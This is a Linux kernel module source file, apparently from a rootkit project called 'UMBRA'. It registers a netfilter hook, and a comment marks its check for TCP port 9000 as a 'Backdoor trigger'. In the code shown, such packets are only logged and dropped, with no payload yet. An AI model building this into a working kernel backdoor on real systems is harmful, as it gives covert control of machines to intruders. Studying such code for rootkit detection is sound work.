#include "../include/netfilter_manager.h"

static struct net n;

unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;    
    struct sk_buff *sock_buff = skb;

    printk(KERN_INFO "UMBRA:: Called nethook");

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }

    ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        dport = htons((unsigned short int) tcp_header->dest);
        //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
        if(dport != 9000){
            return NF_ACCEPT; //We ignore those not for port 9000
        }
        printk(KERN_INFO "UMBRA:: Received packet on port 9000");
        
        return NF_DROP;
    }
    return NF_ACCEPT;

}

/**
 * The struct comes from netfilter
 */ 
/*static struct nf_hook_ops nf_hook_struct = {
    .hook	  = (nf_hookfn*)net_hook,
    //.owner	  = THIS_MODULE,
    .pf		  = PF_BRIDGE,
    .hooknum  = NF_INET_PRE_ROUTING, //Right after ip_rcv
    .priority = NF_IP_PRI_FIRST
};*/

static struct nf_hook_ops nfho;

/**
 * Registers predefined nf_hook_ops
 */ 
int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error registering nf hook");
    }else{
        printk(KERN_INFO "UMBRA:: Registered nethook");
    }
    
    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */ 
void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
    printk(KERN_INFO "UMBRA:: Unregistered nethook");

}